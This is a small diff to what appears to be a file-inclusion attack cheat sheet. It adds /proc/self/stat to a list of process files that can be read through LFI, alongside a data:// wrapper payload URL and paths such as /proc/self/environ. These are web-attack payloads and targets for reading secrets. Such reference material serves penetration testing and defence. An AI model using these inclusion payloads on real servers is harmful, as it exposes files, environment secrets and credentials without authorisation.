@@ -173,6 +173,7 @@ http://domain/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
 ```
 > Use LFI to gather information about the system and processes
 ```
+/proc/self/stat - get pid, parent pid
 /proc/self/cmdline - get commandline of current process
 /proc/self/environ - get environment variables
 /proc/self/exe - get binary
